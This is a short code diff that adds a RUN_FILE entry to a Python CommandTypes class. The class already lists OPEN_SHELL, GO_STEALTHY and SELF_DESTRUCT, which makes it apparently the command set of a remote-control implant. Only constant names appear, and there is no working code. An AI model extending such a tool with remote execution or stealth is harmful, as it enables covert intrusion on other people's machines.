@@ -8,6 +8,7 @@ class CommandTypes:
     OPEN_SHELL = "OPEN_SHELL"
     GO_STEALTHY = "GO_STEALTHY"
     SELF_DESTRUCT = "SELF_DESTRUCT"
+    RUN_FILE = "RUN_FILE"
 
 
 class CommandRequest:
